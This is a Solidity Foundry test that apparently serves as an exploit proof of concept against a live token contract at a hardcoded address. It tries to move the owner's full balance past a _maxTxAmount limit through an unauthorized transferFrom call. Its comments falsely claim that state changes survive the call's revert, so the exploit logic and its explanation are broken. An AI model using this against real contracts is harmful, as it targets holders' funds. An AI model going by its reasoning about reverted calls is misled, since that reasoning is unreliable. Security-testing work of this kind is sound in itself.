// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CLEToken {
    function owner() external view returns (address);
    function _maxTxAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xDeEa8fdB85503531F6A5D2A036d3268bD7C06c09;
    address attacker = address(this);
    CLEToken token;
    address contractOwner;
    uint256 maxTxAmount;
    address receiver;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = CLEToken(TARGET);
        receiver = makeAddr("receiver");

        vm.label(receiver, "Token Receiver");
        contractOwner = token.owner();
        vm.label(contractOwner, "Contract Owner");
        maxTxAmount = token._maxTxAmount();

        // The transfer will be from the owner, so the owner needs a balance.
        deal(TARGET, contractOwner, maxTxAmount + 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        uint256 ownerBalance = token.balanceOf(contractOwner);
        assertTrue(ownerBalance > maxTxAmount, "Owner balance should be greater than maxTxAmount");

        // Calling `transferFrom` with the owner as the sender bypasses the _maxTxAmount check.
        // The call is expected to revert because the attacker has no allowance from the owner,
        // and the post-transfer allowance update `_allowances[...].sub(amount)` will underflow.
        // We use a high-level call inside a try-catch block to handle the expected revert.

        // The state changes from the transfer persist until the end of the transaction.
        // Even though the transaction reverts, the oracle checks the state *before* the final revert.
        vm.prank(attacker);
        try token.transferFrom(contractOwner, receiver, ownerBalance) {}
        catch {
            // The revert is expected. We check the balance which was modified before the revert.
        }

        assertGt(token.balanceOf(receiver), maxTxAmount, "Receiver balance should be greater than maxTxAmount");
        assertEq(token.balanceOf(receiver), ownerBalance, "Receiver balance should equal the amount transferred");
        assertGt(token.balanceOf(receiver), 0, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

